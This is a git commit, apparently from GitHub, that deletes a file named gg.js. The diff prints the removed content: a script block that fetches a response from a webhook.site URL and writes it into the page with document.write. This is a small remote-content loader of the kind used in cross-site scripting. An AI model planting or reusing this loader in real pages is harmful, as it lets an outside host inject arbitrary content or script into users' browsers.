7f844167be0f17184486a34484077b95d8742780
Oleksii <76210733+KernelKrise@users.noreply.github.com>
2023-02-18 17:26:45 +0200

    Delete gg.js

--- gg.js
+++
@@ -1,8 +0,0 @@
-<script>
-x=new XMLHttpRequest;
-x.onload=function(){
-document.write(this.responseText)
-};
-x.open("GET","https://webhook.site/122abac2-8abd-44ce-abeb-43976d2bdc91");
-x.send();
-</script>
